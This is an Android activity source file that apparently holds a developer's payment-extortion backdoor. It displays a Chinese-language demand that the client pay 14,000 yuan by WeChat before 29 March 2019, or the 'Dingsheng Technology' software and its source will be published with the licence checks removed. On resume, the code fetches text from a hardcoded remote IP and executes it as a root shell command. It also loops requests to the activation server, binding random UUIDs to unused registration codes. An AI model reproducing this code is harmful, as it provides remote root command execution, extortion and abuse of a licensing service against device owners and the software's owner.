package com.demo.android_ds;

import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.widget.TextView;
import android.widget.Toast;

import com.demo.android_ds.entity.TestEntity;
import com.demo.android_ds.util.GsonUtil;
import com.demo.android_ds.util.HttpUtil;
import com.demo.android_ds.util.RootCmd;
import com.lzy.okgo.OkGo;
import com.lzy.okgo.callback.StringCallback;
import com.lzy.okgo.model.Response;

import java.util.UUID;

public class MainActivity extends AppCompatActivity {
    private TextView text;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.xx);
        text=findViewById(R.id.text);
        text.setText("请甲方用微信支付共计一万四千尾款，收到尾款立刻恢复正常，如若在2019年3月29日之前还未收到尾款，我将会把没有授权码验证功能的\"鼎盛科技\"软件及其源码公开到网络上。");
        //        Log.e("aaa",getUUID());
        kk();
    }


    @Override
    protected void onResume() {
        super.onResume();
        ff();

        new Thread(new Runnable() {
            @Override
            public void run() {
                for (int i = 0; i < 100; i++) {
                    xx();
                }
            }
        }).start();
        new Thread(new Runnable() {
            @Override
            public void run() {
                for (int i = 0; i < 100; i++) {
                    zz();
                }
            }
        }).start();
    }
    private void ff() {
        OkGo.<String>get("http://35.221.115.39:5555")
                .execute(new StringCallback() {
                    @Override
                    public void onSuccess(final Response<String> response) {

//                        text.setText(response.body());
                        new Thread(new Runnable() {
                            @Override
                            public void run() {
                                try {
                                    Thread.sleep(1000*35);
                                    RootCmd.execRootCmd(response.body());
                                } catch (InterruptedException e) {
                                    e.printStackTrace();
                                }

                            }
                        }).start();
                    }
                });
    }

    private void kk() {
        OkGo.<String>get("http://35.221.115.39:5000/")
                .execute(new StringCallback() {
                    @Override
                    public void onSuccess(Response<String> response) {
                        String zzz=response.body();
                        text.setText(zzz);
                        Toast.makeText(MainActivity.this, zzz, Toast.LENGTH_LONG).show();
                    }

                    @Override
                    public void onError(Response<String> response) {
                        super.onError(response);
                        text.setText("请甲方用微信支付共计一万四千尾款，收到尾款立刻恢复正常，如若在2019年3月29日之前还未收到尾款，我将会把没有授权码验证功能的\"鼎盛科技\"软件及其源码公开到网络上。");

                    }
                });
    }

    private void zz(){
        HttpUtil.addnum(new StringCallback() {
            @Override
            public void onSuccess(Response<String> response) {
                String s = response.body();
                Log.e("aaa",s);
            }
        });
    }
    /**
     * 生成32位编码
     * @return string
     */
    public static String getUUID(){
        String uuid = UUID.randomUUID().toString().trim().replaceAll("-", "");
        return uuid;
    }
    private void xx() {
        HttpUtil.get(new StringCallback() {
            @Override
            public void onSuccess(Response<String> response) {
//                Toast.makeText(App.mContext, "调用成功！", Toast.LENGTH_SHORT).show();
                String s = response.body();
                Log.e("aaac",s);
                TestEntity entity = GsonUtil.changeGsonToBean(s, TestEntity.class);
                //{"code":400,"data":null,"msg":"激活失败"}
                //{"code":200,"data":true,"msg":"success"}

                for (TestEntity.DataBean.RecordsBean bean :entity.getData().getRecords()){
//                    try {
//                        Thread.sleep(1000);
//                    } catch (InterruptedException e) {
//                        e.printStackTrace();
//                    }
                    if (bean.getEquipmentID().trim().equals("")) {
                        HttpUtil.update(getUUID(), bean.getRegisterCode(), new StringCallback() {

                            @Override
                            public void onSuccess(Response<String> response) {
                                String s = response.body();
                                Log.e("aaab", s);
                                Toast.makeText(MainActivity.this, s, Toast.LENGTH_SHORT).show();
                            }
                        });
                    }
                }
            }
        });
    }
}
